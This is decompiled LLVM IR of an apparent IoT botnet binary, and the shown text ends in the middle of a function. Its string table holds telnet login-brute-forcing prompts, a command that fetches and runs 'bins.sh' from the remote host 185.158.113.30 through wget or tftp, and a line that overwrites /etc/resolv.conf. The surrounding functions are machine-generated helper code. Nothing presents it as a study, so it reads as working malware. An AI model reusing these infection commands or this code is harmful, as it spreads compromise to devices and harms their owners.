source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }

@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80555ec.2 = global i32 0
@global_var_8055604.3 = local_unnamed_addr global i32* @global_var_80555ec.2
@global_var_80558e4.4 = global i32 0
@global_var_80529dd.5 = constant [7 x i8] c"x86_32\00"
@global_var_8052a1a.10 = constant [8 x i8] c"UNKNOWN\00"
@global_var_8055920.11 = global i32 0
@global_var_8055924.12 = local_unnamed_addr global i32 0
@global_var_8055928.13 = local_unnamed_addr global i32 0
@global_var_805567c.14 = local_unnamed_addr global i32 4095
@global_var_8055678.15 = local_unnamed_addr global i32 362436
@global_var_8052a22.16 = constant [7 x i8] c"(null)\00"
@global_var_8052a29.18 = constant [3 x i8] c"-c\00"
@global_var_8052a2c.19 = constant [3 x i8] c"sh\00"
@global_var_8052a2f.20 = constant [8 x i8] c"/bin/sh\00"
@global_var_8052a40.21 = constant i32 -1
@global_var_8052e40.22 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_8052e4e.23 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_8055900.24 = local_unnamed_addr global i32 0
@global_var_8052e57.25 = constant [5 x i8] c"PING\00"
@global_var_8055908.26 = local_unnamed_addr global i32 0
@global_var_805590c.27 = local_unnamed_addr global i32 0
@global_var_805b988.28 = local_unnamed_addr global i32 0
@global_var_8052e5c.29 = constant [6 x i8] c":>%$#\00"
@global_var_8052e63.30 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_805b980.31 = local_unnamed_addr global i32 0
@global_var_8052e6f.32 = constant [6 x i8] c"ogin:\00"
@global_var_8052e75.33 = constant [3 x i8] c"\0D\0A\00"
@global_var_8052e78.34 = constant [9 x i8] c"assword:\00"
@global_var_8052e81.35 = constant [9 x i8] c"ncorrect\00"
@global_var_80528c0.36 = constant [14 x i8] c"sh || shell\0D\0A\00"
@global_var_80528d0.37 = constant [79 x i8] c"cd /var/ || cd /tmp/ || cd /var/run( || cd /var/tmp/ || cd /dev/ || cd /mnt/\0D\0A\00"
@global_var_8052920.38 = constant [125 x i8] c"busybox wget || wget 185.158.113.30/bins.sh; busybox tftp || tftp -g -r 185.158.113.30 bins.sh; sh bins.sh || bash bins.sh\0D\0A\00"
@global_var_80529a0.39 = constant [61 x i8] c"busybox echo || echo nameserver 8.8.8.8 > /etc/resolv.conf\0D\0A\00"
@global_var_8055668.40 = local_unnamed_addr global [4 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80528c0.36, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_80528d0.37, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_8052920.38, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_80529a0.39, i32 0, i32 0)]
@global_var_8055674.41 = local_unnamed_addr global [61 x i8]* @global_var_80529a0.39
@global_var_805566c.42 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_80528d0.37, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_8052920.38, i32 0, i32 0)]
@global_var_8055670.43 = local_unnamed_addr global [125 x i8]* @global_var_8052920.38
@global_var_8055684 = external local_unnamed_addr global i32
@global_var_805b974.49 = global i32 0
@global_var_8053640.50 = constant i32 0
@global_var_80556a8.51 = global i32 0
@global_var_80556c0.52 = global i32 0
@global_var_80556a4.53 = local_unnamed_addr global i32* bitcast (i16* @global_var_80556e0.46 to i32*)
@global_var_805b944.54 = global i32 0
@global_var_80557d0.55 = global i32 0
@global_var_805ba4c.57 = global i32 0
@global_var_805ba50.58 = local_unnamed_addr global i32 0
@global_var_805ba54.59 = global i32 0
@global_var_805ba60.60 = local_unnamed_addr global i32 0
@global_var_805bd54.61 = global i32 0
@global_var_805bd7c.62 = local_unnamed_addr global i32 0
@global_var_805bd6c.63 = local_unnamed_addr global i32 0
@global_var_805bd70.64 = local_unnamed_addr global i32 0
@global_var_805bd74.65 = local_unnamed_addr global i32 0
@global_var_805bd90.66 = local_unnamed_addr global i32 0
@global_var_805bd78.67 = local_unnamed_addr global i32 0
@global_var_805bd84.68 = local_unnamed_addr global i32 0
@global_var_805bd88.69 = local_unnamed_addr global i32 0
@global_var_805bd94.70 = local_unnamed_addr global i32 0
@global_var_805bd68.71 = local_unnamed_addr global i32 0
@global_var_805bd64.73 = local_unnamed_addr global i32 0
@global_var_805bd8c.74 = local_unnamed_addr global i32 0
@global_var_805ba5c.75 = local_unnamed_addr global i32 0
@global_var_80557e8.76 = global i32 0
@global_var_8055800.78 = global i32 0
@global_var_8055818 = external global i32
@global_var_8055844.80 = global i32 -1726662223
@global_var_8055820.81 = local_unnamed_addr global i32* @global_var_8055844.80
@global_var_805581c.82 = global i32* @global_var_8055844.80
@global_var_8054294.83 = constant i32 0
@global_var_8054280.84 = constant i32 0
@global_var_80558c0.85 = global i32 0
@global_var_805b958.86 = local_unnamed_addr global i32 0
@global_var_805b960.87 = local_unnamed_addr global i32 0
@global_var_80555e0.89 = global i32 -1
@global_var_80512bb.90 = constant i32 -294069
@global_var_805b968.91 = local_unnamed_addr global i32 0
@global_var_805b96c.92 = local_unnamed_addr global i32 0
@global_var_8054500.93 = constant [10 x i8] c"/dev/null\00"
@global_var_805b964.95 = local_unnamed_addr global i32 0
@global_var_805b95c.96 = local_unnamed_addr global i32 0
@global_var_805365d.97 = constant i32 1970153472
@global_var_80558d8.98 = local_unnamed_addr global i32* @global_var_805365d.97
@global_var_80514a3.99 = constant i32 1928542531
@global_var_80514c7.100 = constant i32 1928542531
@global_var_805b97c.101 = local_unnamed_addr global i32 0
@global_var_805bd98.102 = local_unnamed_addr global i32 0
@global_var_805bd9c.103 = local_unnamed_addr global i32 0
@global_var_80558e0.1 = local_unnamed_addr global i8 0
@global_var_8059920.17 = external local_unnamed_addr global i8*
@global_var_80556e0.46 = global i16 288
@global_var_8055730.47 = local_unnamed_addr global i16 272
@global_var_805ba20.56 = global i8 0
@global_var_805bd80.72 = local_unnamed_addr global i8 0
@global_var_805b954.77 = local_unnamed_addr global i8 0
@global_var_805b970.94 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 54615
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8052810()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_80558e0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8055604.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8055604.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8055604.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80558e0.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055604.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80558e0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 134563292)
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* inttoptr (i32 134567408 to i32*), align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @function_8051357(i32 134535008, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134555716, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048191() local_unnamed_addr {
dec_label_pc_8048191:
  ret i32 ptrtoint ([7 x i8]* @global_var_80529dd.5 to i32)
}

define i32 @function_804819b() local_unnamed_addr {
dec_label_pc_804819b:
  %v1_80481a8 = call i32 @function_8051158(i32 84)
  ret i32 %v1_80481a8
}

define i32 @function_80481af() local_unnamed_addr {
dec_label_pc_80481af:
  ret i32 ptrtoint ([8 x i8]* @global_var_8052a1a.10 to i32)
}

define i32 @function_804822c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804822c:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_8055920.11, align 32
  %v1_804823d = add i32 %arg1, -1640531527
  store i32 %v1_804823d, i32* @global_var_8055924.12, align 4
  %v1_804824a = add i32 %arg1, 1013904242
  store i32 %v1_804824a, i32* %eax.global-to-local, align 4
  store i32 %v1_804824a, i32* @global_var_8055928.13, align 8
  br label %dec_label_pc_804825d

dec_label_pc_804825d:                             ; preds = %dec_label_pc_804822c, %dec_label_pc_804825d
  %storemerge1 = phi i32 [ 3, %dec_label_pc_804822c ], [ %v4_804828d, %dec_label_pc_804825d ]
  %v1_8048263 = add nsw i32 %storemerge1, -3
  store i32 %v1_8048263, i32* %eax.global-to-local, align 4
  %v1_8048266 = mul nuw nsw i32 %v1_8048263, 4
  %v2_8048266 = add i32 %v1_8048266, ptrtoint (i32* @global_var_8055920.11 to i32)
  %v3_8048266 = inttoptr i32 %v2_8048266 to i32*
  %v4_8048266 = load i32, i32* %v3_8048266, align 4
  %v1_8048270 = add nsw i32 %storemerge1, -2
  store i32 %v1_8048270, i32* %eax.global-to-local, align 4
  %v1_8048273 = mul nuw nsw i32 %v1_8048270, 4
  %v2_8048273 = add i32 %v1_8048273, ptrtoint (i32* @global_var_8055920.11 to i32)
  %v3_8048273 = inttoptr i32 %v2_8048273 to i32*
  %v4_8048273 = load i32, i32* %v3_8048273, align 4
  %v2_804827a = xor i32 %v4_8048273, %v4_8048266
  %v2_804827f = xor i32 %storemerge1, -1640531527
  %v1_8048281 = xor i32 %v2_804827f, %v2_804827a
  store i32 %v1_8048281, i32* %eax.global-to-local, align 4
  %v2_8048286 = mul nuw nsw i32 %storemerge1, 4
  %v3_8048286 = add i32 %v2_8048286, ptrtoint (i32* @global_var_8055920.11 to i32)
  %v4_8048286 = inttoptr i32 %v3_8048286 to i32*
  store i32 %v1_8048281, i32* %v4_8048286, align 4
  %v4_804828d = add nuw nsw i32 %storemerge1, 1
  %exitcond = icmp eq i32 %v4_804828d, 4096
  br i1 %exitcond, label %dec_label_pc_8048299, label %dec_label_pc_804825d

dec_label_pc_8048299:                             ; preds = %dec_label_pc_804825d
  %v0_804829a = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804829a

; uselistorder directives
  uselistorder i32 %storemerge1, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 0 }
}

define i32 @function_804829b(i32 %arg1) local_unnamed_addr {
dec_label_pc_804829b:
  %v0_80482b7 = load i32, i32* @global_var_805567c.14, align 4
  %v1_80482bc = add i32 %v0_80482b7, 1
  %v1_80482bd = urem i32 %v1_80482bc, 4096
  store i32 %v1_80482bd, i32* @global_var_805567c.14, align 4
  %v1_80482cc = mul nuw nsw i32 %v1_80482bd, 4
  %v2_80482cc = add i32 %v1_80482cc, ptrtoint (i32* @global_var_8055920.11 to i32)
  %v3_80482cc = inttoptr i32 %v2_80482cc to i32*
  %v4_80482cc = load i32, i32* %v3_80482cc, align 4
  %v7_80482e9 = udiv i32 %v4_80482cc, 228675
  store i32 %v7_80482e9, i32* @global_var_8055678.15, align 8
  br i1 true, label %dec_label_pc_8048339, label %dec_label_pc_804832b

dec_label_pc_804832b:                             ; preds = %dec_label_pc_804829b
  br label %dec_label_pc_8048339

dec_label_pc_8048339:                             ; preds = %dec_label_pc_804829b, %dec_label_pc_804832b
  %v1_804834e = mul nuw nsw i32 %v1_80482bd, 4
  %v2_804834e = add i32 %v1_804834e, ptrtoint (i32* @global_var_8055920.11 to i32)
  %v3_804834e = inttoptr i32 %v2_804834e to i32*
  %v4_804834e = load i32, i32* %v3_804834e, align 4
  ret i32 %v4_804834e

; uselistorder directives
  uselistorder i32 %v1_80482bd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048339, { 1, 0 }
}

define i32 @function_804835b(i8* %arg1) local_unnamed_addr {
dec_label_pc_804835b:
  %v4_8048369 = ptrtoint i8* %arg1 to i32
  %v3_804837a = call i32 @_strlen(i8* %arg1)
  %v1_8048381 = add i32 %v3_804837a, -1
  br label %dec_label_pc_804838a

dec_label_pc_8048387:                             ; preds = %dec_label_pc_804838a
  %v4_8048387 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804838a

dec_label_pc_804838a:                             ; preds = %dec_label_pc_804835b, %dec_label_pc_8048387
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_804835b ], [ %v4_8048387, %dec_label_pc_8048387 ]
  %v6_804838d = add i32 %stack_var_-16.0, %v4_8048369
  %v1_8048390 = inttoptr i32 %v6_804838d to i8*
  %v2_8048390 = load i8, i8* %v1_8048390, align 1
  %v2_8048393 = sext i8 %v2_8048390 to i32
  %v1_8048399 = call i32 @function_804e660(i32 %v2_8048393)
  %v1_804839e = icmp eq i32 %v1_8048399, 0
  %v1_80483a0 = icmp eq i1 %v1_804839e, false
  br i1 %v1_80483a0, label %dec_label_pc_8048387, label %dec_label_pc_80483a7.preheader

dec_label_pc_80483a7.preheader:                   ; preds = %dec_label_pc_804838a
  %v5_80483ad10 = icmp slt i32 %v1_8048381, %stack_var_-16.0
  br i1 %v5_80483ad10, label %dec_label_pc_80483c7, label %dec_label_pc_80483af

dec_label_pc_80483a4:                             ; preds = %dec_label_pc_80483af
  %v4_80483a4 = add i32 %stack_var_-12.011, -1
  %v5_80483ad = icmp slt i32 %v4_80483a4, %stack_var_-16.0
  br i1 %v5_80483ad, label %dec_label_pc_80483c7, label %dec_label_pc_80483af

dec_label_pc_80483af:                             ; preds = %dec_label_pc_80483a7.preheader, %dec_label_pc_80483a4
  %stack_var_-12.011 = phi i32 [ %v4_80483a4, %dec_label_pc_80483a4 ], [ %v1_8048381, %dec_label_pc_80483a7.preheader ]
  %v6_80483b2 = add i32 %stack_var_-12.011, %v4_8048369
  %v1_80483b5 = inttoptr i32 %v6_80483b2 to i8*
  %v2_80483b5 = load i8, i8* %v1_80483b5, align 1
  %v2_80483b8 = sext i8 %v2_80483b5 to i32
  %v1_80483be = call i32 @function_804e660(i32 %v2_80483b8)
  %v1_80483c3 = icmp eq i32 %v1_80483be, 0
  %v1_80483c5 = icmp eq i1 %v1_80483c3, false
  br i1 %v1_80483c5, label %dec_label_pc_80483a4, label %dec_label_pc_80483c7

dec_label_pc_80483c7:                             ; preds = %dec_label_pc_80483a4, %dec_label_pc_80483af, %dec_label_pc_80483a7.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_8048381, %dec_label_pc_80483a7.preheader ], [ %v4_80483a4, %dec_label_pc_80483a4 ], [ %stack_var_-12.011, %dec_label_pc_80483af ]
  %v7_80483f022 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.lcssa
  br i1 %v7_80483f022, label %dec_label_pc_80483f2, label %dec_label_pc_80483cf

dec_label_pc_80483cf:                             ; preds = %dec_label_pc_80483c7, %dec_label_pc_80483cf
  %v6_80483fa24 = phi i32 [ %v6_80483fa, %dec_label_pc_80483cf ], [ %v4_8048369, %dec_label_pc_80483c7 ]
  %storemerge23 = phi i32 [ %v4_80483e7, %dec_label_pc_80483cf ], [ %stack_var_-16.0, %dec_label_pc_80483c7 ]
  %v6_80483df = add i32 %storemerge23, %v4_8048369
  %v1_80483e2 = inttoptr i32 %v6_80483df to i8*
  %v2_80483e2 = load i8, i8* %v1_80483e2, align 1
  %v3_80483e5 = inttoptr i32 %v6_80483fa24 to i8*
  store i8 %v2_80483e2, i8* %v3_80483e5, align 1
  %v4_80483e7 = add i32 %storemerge23, 1
  %v7_80483f0 = icmp sgt i32 %v4_80483e7, %stack_var_-12.0.lcssa
  %v2_80483f8 = sub i32 %v4_80483e7, %stack_var_-16.0
  %v6_80483fa = add i32 %v2_80483f8, %v4_8048369
  br i1 %v7_80483f0, label %dec_label_pc_80483f2, label %dec_label_pc_80483cf

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483cf, %dec_label_pc_80483c7
  %v6_80483fa.lcssa = phi i32 [ %v4_8048369, %dec_label_pc_80483c7 ], [ %v6_80483fa, %dec_label_pc_80483cf ]
  %v22_80483fa = inttoptr i32 %v6_80483fa.lcssa to i8*
  store i8 0, i8* %v22_80483fa, align 1
  ret i32 %v6_80483fa.lcssa

; uselistorder directives
  uselistorder i32 %v6_80483fa.lcssa, { 1, 0 }
  uselistorder i32 %v4_80483e7, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_8048381, { 1, 2, 0 }
  uselistorder i32 %v4_8048369, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 (i32)* @function_804e660, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80483cf, { 1, 0 }
  uselistorder label %dec_label_pc_80483c7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80483af, { 1, 0 }
  uselistorder label %dec_label_pc_804838a, { 1, 0 }
}

define i32 @function_8048406(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048406:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804840c = icmp eq i32* %arg1, null
  br i1 %v4_804840c, label %dec_label_pc_804842b, label %dec_label_pc_8048412

dec_label_pc_8048412:                             ; preds = %dec_label_pc_8048406
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048415 = load i32, i32* %arg1, align 4
  %v3_804841a = inttoptr i32 %v2_8048415 to i8*
  store i8 %tmp8, i8* %v3_804841a, align 1
  %v2_804841f = load i32, i32* %arg1, align 4
  %v1_8048421 = add i32 %v2_804841f, 1
  store i32 %v1_8048421, i32* @edx, align 4
  store i32 %v1_8048421, i32* %arg1, align 4
  br label %dec_label_pc_8048446

dec_label_pc_804842b:                             ; preds = %dec_label_pc_8048406
  %v3_8048441 = bitcast i8* %stack_var_8 to i32*
  %v4_8048441 = call i32 @function_804e628(i32 1, i32* %v3_8048441, i32 1)
  br label %dec_label_pc_8048446

dec_label_pc_8048446:                             ; preds = %dec_label_pc_8048412, %dec_label_pc_804842b
  %v0_8048447 = phi i32 [ %tmp5, %dec_label_pc_8048412 ], [ %v4_8048441, %dec_label_pc_804842b ]
  ret i32 %v0_8048447

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048446, { 1, 0 }
}

define i32 @function_8048448(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048448:
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_80484a9, label %dec_label_pc_8048462

dec_label_pc_8048462:                             ; preds = %dec_label_pc_8048448
  %v4_8048469 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8048469, i32* @edx, align 4
  %v2_804847a23 = load i8, i8* %arg2, align 1
  %v4_804847d25 = icmp eq i8 %v2_804847a23, 0
  %v1_804847f27 = icmp eq i1 %v4_804847d25, false
  br i1 %v1_804847f27, label %dec_label_pc_8048471, label %dec_label_pc_8048481

dec_label_pc_8048471:                             ; preds = %dec_label_pc_8048462, %dec_label_pc_8048471
  %v4_804847729 = phi i32 [ %v5_8048474, %dec_label_pc_8048471 ], [ %v4_8048469, %dec_label_pc_8048462 ]
  %stack_var_-12.028 = phi i32 [ %v4_8048471, %dec_label_pc_8048471 ], [ 0, %dec_label_pc_8048462 ]
  %v4_8048471 = add i32 %stack_var_-12.028, 1
  %v5_8048474 = add i32 %v4_804847729, 1
  %v22_8048474 = inttoptr i32 %v5_8048474 to i8*
  store i32 %v5_8048474, i32* @edx, align 4
  %v2_804847a = load i8, i8* %v22_8048474, align 1
  %v4_804847d = icmp eq i8 %v2_804847a, 0
  %v1_804847f = icmp eq i1 %v4_804847d, false
  br i1 %v1_804847f, label %dec_label_pc_8048471, label %dec_label_pc_8048481

dec_label_pc_8048481:                             ; preds = %dec_label_pc_8048471, %dec_label_pc_8048462
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_8048462 ], [ %v4_8048471, %dec_label_pc_8048471 ]
  %v5_8048487 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_8048487, label %dec_label_pc_8048492, label %dec_label_pc_8048498

dec_label_pc_8048492:                             ; preds = %dec_label_pc_8048481
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_8048495 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_8048498

dec_label_pc_8048498:                             ; preds = %dec_label_pc_8048481, %dec_label_pc_8048492
  %storemerge = phi i32 [ %v5_8048495, %dec_label_pc_8048492 ], [ 0, %dec_label_pc_8048481 ]
  %v1_804849b = and i32 %arg4, 2
  %tmp43 = mul nuw nsw i32 %v1_804849b, 8
  %tmp44 = or i32 %tmp43, 32
  br label %dec_label_pc_80484a9

dec_label_pc_80484a9:                             ; preds = %dec_label_pc_8048498, %dec_label_pc_8048448
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_8048448 ], [ %storemerge, %dec_label_pc_8048498 ]
  %stack_var_-16.0 = phi i32 [ 32, %dec_label_pc_8048448 ], [ %tmp44, %dec_label_pc_8048498 ]
  %v1_80484ac = urem i32 %arg4, 2
  %v2_80484ac = icmp eq i32 %v1_80484ac, 0
  %v1_80484b1 = icmp eq i1 %v2_80484ac, false
  br i1 %v1_80484b1, label %dec_label_pc_80484f3.preheader, label %dec_label_pc_80484cd.preheader

dec_label_pc_80484cd.preheader:                   ; preds = %dec_label_pc_80484a9
  %tmp45 = icmp slt i32 %stack_var_12.0, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_80484b5.lr.ph, label %dec_label_pc_80484f3.preheader

dec_label_pc_80484b5.lr.ph:                       ; preds = %dec_label_pc_80484cd.preheader
  %v2_80484c2 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_80484b5

dec_label_pc_80484b5:                             ; preds = %dec_label_pc_80484b5.lr.ph, %dec_label_pc_80484b5
  %stack_var_-20.019 = phi i32 [ 0, %dec_label_pc_80484b5.lr.ph ], [ %v4_80484c7, %dec_label_pc_80484b5 ]
  %stack_var_12.118 = phi i32 [ %stack_var_12.0, %dec_label_pc_80484b5.lr.ph ], [ %v4_80484ca, %dec_label_pc_80484b5 ]
  %v3_80484c2 = call i32 @function_8048406(i32* %v2_80484c2, i32 %stack_var_-16.0)
  %v4_80484c7 = add i32 %stack_var_-20.019, 1
  %v4_80484ca = add i32 %stack_var_12.118, -1
  %tmp47 = icmp slt i32 %v4_80484ca, 1
  %tmp48 = icmp eq i1 %tmp47, false
  br i1 %tmp48, label %dec_label_pc_80484b5, label %dec_label_pc_80484f3.preheader

dec_label_pc_80484f3.preheader:                   ; preds = %dec_label_pc_80484b5, %dec_label_pc_80484cd.preheader, %dec_label_pc_80484a9
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_80484a9 ], [ %stack_var_12.0, %dec_label_pc_80484cd.preheader ], [ %v4_80484ca, %dec_label_pc_80484b5 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_80484a9 ], [ 0, %dec_label_pc_80484cd.preheader ], [ %v4_80484c7, %dec_label_pc_80484b5 ]
  %v2_80484f67 = load i8, i8* %arg2, align 1
  %v4_80484f99 = icmp eq i8 %v2_80484f67, 0
  %v1_80484fb11 = icmp eq i1 %v4_80484f99, false
  br i1 %v1_80484fb11, label %dec_label_pc_80484d5.lr.ph, label %dec_label_pc_8048517.preheader

dec_label_pc_80484d5.lr.ph:                       ; preds = %dec_label_pc_80484f3.preheader
  %v4_80484f36 = ptrtoint i8* %arg2 to i32
  %v2_80484e8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_80484d5

dec_label_pc_80484d5:                             ; preds = %dec_label_pc_80484d5.lr.ph, %dec_label_pc_80484d5
  %v4_80484f314 = phi i32 [ %v4_80484f36, %dec_label_pc_80484d5.lr.ph ], [ %v5_80484f0, %dec_label_pc_80484d5 ]
  %stack_var_-20.113 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484d5.lr.ph ], [ %v4_80484ed, %dec_label_pc_80484d5 ]
